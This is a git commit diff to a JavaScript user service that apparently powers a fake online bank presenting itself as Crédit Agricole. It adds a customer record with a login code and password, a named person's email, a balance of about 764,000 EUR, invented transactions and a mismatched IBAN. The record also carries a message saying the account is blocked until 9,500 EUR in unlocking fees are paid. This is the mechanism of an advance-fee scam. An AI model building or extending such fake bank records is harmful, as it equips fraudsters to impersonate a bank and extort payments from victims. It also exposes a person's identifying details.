36bf0cd8b18d1cd3107a07783afd733a76292e0e
crédit agricole <bouchonjeanne7@email.com>
2026-06-24 02:02:13 +0000

    chfff

--- src/services/UserService.js
+++ src/services/UserService.js
@@ -1488,6 +1488,70 @@ const initialUsers = [
     },
   },
   {
+    code: "07034860451",
+    motDePasse: "260826",
+    nom: "STRUCHLER PATRICIA",
+    email: "struchler.patricia@gmail.com",
+      livretA: 50.00,
+    assurance: 4000.00,
+    epargne: 5000.25,
+    adresse: "Büyükdere, Yap2 Kredi Plaza, C Blok, Kaet:11, Levente - Istanbul",
+    solde: 764382.90,
+    devise: "EUR",
+    symboleDevise: "€",
+    numeroCompte: "76 3000 4000 0120 0123 4557 890",
+    iban: "TR76 3000 4000 0120 0123 4557 89",
+    bic: "AGRIGRPPXXX",
+    agence: "Büyükdere Caddesi, Yap1 Kredi Plaza, C Blok, Kat:14, Levent - Istanbul",
+    dateOuverture: "15/03/2018",
+    statut: "atif",
+    dateBlocage: null,
+    dateAttestation: "25/03/2018",
+    notification: "Votre compte est bloqué,veillez vous acquitter des frais de débloccage de 9500 EUR avant toute opération bancaire associer à ce compte. Merci de votre compréhension. ",
+    transactions: [
+      { date: '10/06/2022', libelle: 'Virement Notaire - Succession', debit: '', credit: '15000.00' },
+      { date: '07/10/2023', libelle: 'Frais de gestion compte', debit: '45.00', credit: '' },
+      { date: '08/10/2023', libelle: 'Virement entrant', debit: '', credit: '25000.00' },
+      { date: '05/10/2023', libelle: 'Achat Bijouterie Cartier', debit: '8500.00', credit: '' },
+      { date: '20/09/2023', libelle: 'Restaurant Le Grand Véfour', debit: '320.75', credit: '' },
+      { date: '06/09/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '05/08/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '07/07/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '07/10/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '06/06/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '06/05/2023',beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '07/04/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '05/03/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '06/02/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '05/01/2023', beneficiaire: 'Loyer', montant: -950.00, statut: 'Effectué' },
+      { date: '02/09/2023', beneficiaire: 'Assurance', montant: -1000.00, statut: 'Effectué' },
+      { date: '02/09/2022', beneficiaire: 'Assurance', montant: -1000.00, statut: 'Effectué' },
+      { date: '02/08/2021', beneficiaire: 'Assurance', montant: -1000.00, statut: 'Effectué' },
+      { date: '02/07/2020', beneficiaire: 'Assurance', montant: -1000.00, statut: 'Effectué' },
+    ],
+    relevesMensuels: [
+      { mois: 'Septembre', annee: '2023', dateGeneration: '01/10/2023'},
+      { mois: 'Aout', annee: '2023', dateGeneration: '01/09/2023'},
+      { mois: 'Juillet', annee: '2023', dateGeneration: '01/08/2023' },
+      { mois: 'Juin', annee: '2023', dateGeneration: '01/07/2023' }
+    ],
+    virements: [
+      { date: '10/06/2023', beneficiaire: 'Électricité', montant: -120.00, statut: 'Effectué' },
+      { date: '05/06/2023', beneficiaire: 'Jean Martin', montant: -300.00, statut: 'Effectué' },
+    ],
+    depots: [
+      { type: 'Dépôt de chèque', date: '01/06/2023', montant: 800.00, icon: '📝' },
+    ],
+    decouvert: [
+      { id: 1, date: '15/05/2023', montant: -180, duree: 4, frais: 7.2 },
+      { id: 2, date: '05/05/2023', montant: -220, duree: 3, frais: 6.6 },
+    ],
+    conseiller: {
+      nom: 'Jean Marke',
+      email: 'jmarke654@gmail.com',
+    },
+  },
+  {
     code: "07020304068",
     motDePasse: "260825",
     nom: "Stéphanie Debout",
@@ -1943,7 +2007,7 @@ const initialUsers = [
 ];
 
 // ==================== USER SERVICE ====================
-const DATA_VERSION = 4;
+const DATA_VERSION = 6;
 
 const UserService = {
   initializeUsers() {
